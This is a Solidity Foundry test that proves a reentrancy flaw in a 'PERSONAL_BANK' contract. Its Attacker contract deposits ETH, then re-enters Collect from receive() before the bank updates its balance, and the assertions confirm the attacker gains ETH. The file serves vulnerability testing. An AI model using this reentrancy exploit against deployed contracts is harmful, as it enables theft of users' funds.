
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PERSONAL_BANK} from "../src/PERSONAL_BANK.sol";

contract TestReentrancyPERSONAL_BANK is Test {
    PERSONAL_BANK public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new PERSONAL_BANK();
        _attacker = new Attacker(address(_contractUnderTest));

        // Configure bank so attacker can withdraw any positive amount
        _contractUnderTest.SetMinSum(0);
        _contractUnderTest.SetLogFile(address(new LogFileMock()));
        _contractUnderTest.Initialized();
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0.01 ether && attackVal < 10 ether);

        // Fund the bank so it has ETH to steal
        vm.deal(address(_contractUnderTest), attackVal * 10);

        // Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // Initial deposit from attacker into the bank
        _attacker.setupAttack{value: attackVal}(attackVal);

        uint256 bankBalanceBefore = address(_contractUnderTest).balance;
        uint256 attackerBalanceBefore = address(_attacker).balance;

        _attacker.attack(attackVal);

        uint256 bankBalanceAfter = address(_contractUnderTest).balance;
        uint256 attackerBalanceAfter = address(_attacker).balance;

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker did not gain ETH.");
        assertLt(bankBalanceAfter, bankBalanceBefore, "Bank balance did not decrease.");
    }

    receive() external payable {}
}

contract Attacker {
    PERSONAL_BANK public _victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        _victim = PERSONAL_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;

        // Deposit into the vulnerable bank
        _victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;

        // Trigger vulnerable Collect
        _victim.Collect(val);

        if (attackCallCount > 1 && address(this).balance > initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter before balance is updated
            _victim.Collect(storedAttackVal);
        }
    }
}

contract LogFileMock {
    function AddMessage(address, uint256, string memory) public {}
}
